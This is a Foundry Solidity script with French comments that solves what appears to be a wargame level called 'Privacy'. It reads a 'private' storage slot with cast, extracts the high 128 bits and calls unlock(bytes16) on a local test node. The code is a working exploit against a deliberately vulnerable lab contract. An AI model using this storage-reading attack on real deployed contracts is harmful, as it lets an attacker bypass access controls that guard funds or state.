// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Script, console} from "forge-std/Script.sol";
import {DevOpsTools} from "lib/foundry-devops/src/DevOpsTools.sol";

contract PrivacyInteractions is Script {
    function run() public {
        // address privacyMostRecentDeployment = DevOpsTools
        //     .get_most_recent_deployment("Privacy", block.chainid);
        readStorageAndHackPrivacy(0xDc64a140Aa3E981100a9becA4E685f962f0cF6C9);
    }

    function readStorageAndHackPrivacy(address privacyContractAdress) public {
        //J'utilise ici cast pour lire la valeur de la key qui represente le slot 5
        //Dans le contract Privacy.sol
        //cast storage $p 5 --rpc-url 127.0.0.1:8545
        //output: 0x9e29ae33513b7fd1a85710d0c2f8bc0408eeffba89ca290e37c927a652bea8f4
        //$p correspond à l'adresse du smart contract Privacy
        //Je vais interagir maintenant avec le contract en bas niveau avec la fonction call
        bytes32 dataAtSlot5InPrivacy = 0x9e29ae33513b7fd1a85710d0c2f8bc0408eeffba89ca290e37c927a652bea8f4;
        //bytes16(uint128(uint256(dataAtSlot5InPrivacy)))
        //cela recupère les bits de poids faibles donc recupère de la droite
        //vers la gauche
        //donc pour recupérer les premiers 128 bits qui correspondent au bit de poids forts
        //de la gauche vers la droite je dois effectuer une opérations de décalage
        //en ajoutant >>128
        //Cela decale les 128 bits de poids forts vers la droite
        //et en faisant maintenant //bytes16(uint128(uint256(dataAtSlot5InPrivacy)))
        //je recupère ces 128 bits
        //Je deplace les 128 bits de poids forts vers la droite
        bytes32 move = dataAtSlot5InPrivacy >> 128;
        bytes memory unlockFunctionSignature = abi.encodeWithSignature(
            "unlock(bytes16)",
            //Je recupère maintenant ces 128 bits qui sont a ma droite
            //Et qui respresente maintenant mes bits de poids faibles
            bytes16(uint128(uint256(move)))
        );
        //Lisons la valeur de locked au slot 0 d'abord
        //cast storage $p 0 --rpc-url 127.0.0.1:8545
        //0x0000000000000000000000000000000000000000000000000000000000000001
        //Effectuons maintenant la fonction
        (bool result, bytes memory data) = privacyContractAdress.call(
            unlockFunctionSignature
        );

        console.log("Encode with signature");
        console.logBytes(unlockFunctionSignature);
        console.log("result is ", result);
        console.logBytes(data);
    }
}
